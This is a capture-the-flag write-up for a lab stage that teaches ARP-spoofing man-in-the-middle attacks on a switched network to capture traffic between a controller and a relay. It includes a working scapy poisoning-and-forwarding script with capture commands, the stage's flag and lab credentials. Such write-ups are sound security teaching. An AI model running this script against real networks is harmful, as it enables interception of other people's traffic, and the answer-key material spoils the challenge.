# The Spine 3/5 — Interpose ("Hear what they say to each other")

**Flag:** `reentry{4rp_h3ld_th3_m4n_1n_th3_m1ddl3}`

| | |
|---|---|
| Category | Networking / MITM (ARP spoofing on a switched segment) |
| Entry | `ssh eng@tcp.reentry.lol -p 30081` (password `halley`) |
| Parties | controller **lazarus-bc = 10.185.1.3**, relay **RELAY-GW = 10.185.1.2** |
| Channel | `udp/9600` (MRDN bus), controller:9601 ↔ relay:9600 |
| Trick | ARP-poison both sides + `ip_forward=1`, hold it and **relay the traffic**, record long enough to catch the periodic operator frame (op=0x0a) that carries the flag |

> **Challenge brief:** The controller and the relay talk to each other all day and none of it
> reaches you. A switch only sends a conversation to the two ports having it. You will have to
> be somewhere you are not — and stay there, because the moment you stop insisting, the segment
> remembers the truth. And whatever you take off the wire, keep passing it on: the bus notices
> silence immediately. Hear what they say to each other.

Reading between the lines:
- **switch** → unicast traffic does not reach us → we need a **MITM** (ARP spoofing).
- "stay there… when you stop insisting, the segment remembers the truth" → the ARP cache
  expires, so **keep** sending forged ARP replies.
- "keep passing it on… the bus notices silence" → turn on **IP forwarding**, do not black-hole
  the traffic (otherwise the controller/relay notice the broken link and go quiet, taking the
  flag with them).

---

## 1. Starting point

We are on the HALLEY laptop (`10.185.1.4`, MAC cloned to `02:4d:52:71:68:0d` from stage 1), with
passwordless sudo. The segment has `scapy 2.5.0`, `tcpdump`, `nmap`, and `python3`.

```bash
ssh eng@tcp.reentry.lol -p 30081      # halley
python3 -c "import scapy; print(scapy.__version__)"   # 2.5.0
```

---

## 2. Who talks to whom

From stage 1 (the segment map on the relay console):

```
controller   lazarus-bc (bus udp/9600)
relay        this node  (bus udp/9600, mgmt tcp/9601)
terminals    RT-1 THERMAL, RT-7 AIRLOCK, RT-9 ATTITUDE
```

The relay is `10.185.1.2`. We look for the controller among the bus hosts — `10.185.1.3` is
reachable and has **no open TCP port** (typical of a device that only talks over the UDP bus):

```bash
for h in 1 3 5 6 7 8; do echo "== .$h =="; nmap -p1-65535 --open 10.185.1.$h | grep /tcp; done
# .3 -> no ports  => controller candidate
```

Passively from the laptop we only see the relay broadcast beacon (`udp/9602`) — the `9600`
conversation is unicast and the switch does not pass it to us. Hence the MITM.

---

## 3. The MITM attack (ARP spoofing + forwarding)

Idea:
1. Tell the relay (.2): "`.3` is at my MAC".
2. Tell the controller (.3): "`.2` is at my MAC".
3. Do this **in a loop** (about every 1 s), because ARP entries expire.
4. Turn on `ip_forward=1` so the kernel passes packets to the real destinations (no silence).
5. Record `udp/9600`.

```python
# mitm.py (scapy)
import time, threading, subprocess
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf
IFACE="eth0"; A="10.185.1.2"; B="10.185.1.3"      # relay, controller
conf.iface=IFACE; mymac=get_if_hwaddr(IFACE)

def mac_of(ip):
    ans,_=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=3,retry=2,verbose=0)
    for _,r in ans: return r.hwsrc
macA, macB = mac_of(A), mac_of(B)

stop=threading.Event()
def poison():
    pa=Ether(dst=macA)/ARP(op=2,psrc=B,hwsrc=mymac,pdst=A,hwdst=macA)  # .2 <- ".3 is me"
    pb=Ether(dst=macB)/ARP(op=2,psrc=A,hwsrc=mymac,pdst=B,hwdst=macB)  # .3 <- ".2 is me"
    while not stop.is_set():
        sendp(pa,verbose=0); sendp(pb,verbose=0); time.sleep(1.0)
def restore():  # clean up: send the real mappings
    pa=Ether(dst=macA)/ARP(op=2,psrc=B,hwsrc=macB,pdst=A,hwdst=macA)
    pb=Ether(dst=macB)/ARP(op=2,psrc=A,hwsrc=macA,pdst=B,hwdst=macB)
    for _ in range(8): sendp(pa,verbose=0); sendp(pb,verbose=0); time.sleep(0.3)

subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
subprocess.run("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects", shell=True)  # no ICMP-redirect
threading.Thread(target=poison,daemon=True).start()
subprocess.Popen(["tcpdump","-i",IFACE,"-nn","-s0","-w","/tmp/spine3.pcap","udp or arp"])
time.sleep(240)                                   # <-- record for a LONG time
stop.set(); restore()
```

> **Important:** the flag is carried by a frame that appears **rarely** (op=0x0a, operator
> event). In the first ~55 s you only see the POLL/STATUS loop, which is why we record ~4 min.
> Best to run the attack in the background (`nohup`), as the SSH session can drop.

```bash
sudo nohup python3 /tmp/mitm.py >/tmp/out 2>&1 &
```

---

## 4. What is on the bus

The normal loop is polling the terminals (MRDN frame format from stage 2):

```
10.185.1.3 -> 10.185.1.2  op=0x01 term=1 seq=0x4732 dlen=0           POLL  (RT-1 THERMAL)
10.185.1.2 -> 10.185.1.3  op=0x81 term=1 seq=0x4732 dlen=7  NOMINAL  STATUS
10.185.1.3 -> 10.185.1.2  op=0x01 term=7 ...                          POLL  (RT-7 AIRLOCK)
10.185.1.2 -> 10.185.1.3  op=0x81 term=7 ...        dlen=4  OPEN      STATUS
10.185.1.3 -> 10.185.1.2  op=0x01 term=9 ...                          POLL  (RT-9 ATTITUDE)
10.185.1.2 -> 10.185.1.3  op=0x81 term=9 ...        dlen=7  NOMINAL   STATUS
```

`op=0x01` = POLL, `op=0x81` = STATUS. Between these, the relay periodically sends an **operator
event** `op=0x0a`:

```bash
# after recording:
strings -n4 /tmp/spine3.pcap | grep -a reentry | sort -u
```

```
10.185.1.2:60374 -> 10.185.1.3:9601  op=0x0a term=0 seq=0x0afd dlen=54 crc=795c
   payload: OPR-CF9F790AE4 reentry{4rp_h3ld_th3_m4n_1n_th3_m1ddl3}
```

> ## 🏁 Flag: `reentry{4rp_h3ld_th3_m4n_1n_th3_m1ddl3}`

The payload also carries the operator credential `OPR-CF9F790AE4` — useful in stage 5.

---

## 5. Cleanup (important!)

After catching the flag, restore the correct ARP and turn off forwarding, so you do not leave
the segment broken (and do not break later stages):

```bash
sudo pkill -9 tcpdump
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
# restore() in the script sends the real mappings; verify:
ip neigh | grep -E '10.185.1.(2|3)'   # should point to 02:42:0a:b9:01:02 / :03
```

---

## 6. TL;DR — command by command

```bash
ssh eng@tcp.reentry.lol -p 30081           # halley

# 1) identify the two sides
nmap -p1-65535 --open 10.185.1.3           # no TCP -> controller (lazarus-bc)
                                           # relay = 10.185.1.2 (from stage 1)

# 2) MITM in the background: continuous ARP-poison .2<->.3 + ip_forward=1 + tcpdump (>=4 min)
sudo nohup python3 mitm.py &               # script from section 3

# 3) pull the flag out of the recording
strings -n4 /tmp/spine3.pcap | grep -a reentry | sort -u
#   OPR-CF9F790AE4 reentry{4rp_h3ld_th3_m4n_1n_th3_m1ddl3}

# 4) cleanup
sudo pkill -9 tcpdump; echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

## 7. The point

The segment is **switched**, so the controller↔relay conversation never reaches the laptop's
port. **ARP has no authentication** — with forged ARP replies we tell both sides the other is
at our MAC, and we become the man in the middle. To keep the conversation alive (silence would
reveal the attack and cost us the flag), we **forward** the traffic (`ip_forward=1`) and
**continuously** refresh the poisoned ARP entries. The flag rides on a periodic operator frame
(`op=0x0a`) that only shows up with a long enough capture. Hence: *ARP held the man in the
middle*.

> **Previous:** [1 - Patch In (Trunk Access)](1%20-%20Patch%20In%20%28Trunk%20Access%29.md) · [2 - Relay Firmware](2%20-%20Relay%20Firmware.md)
> **Next:** [4 - Rewrite](4%20-%20Rewrite.md)
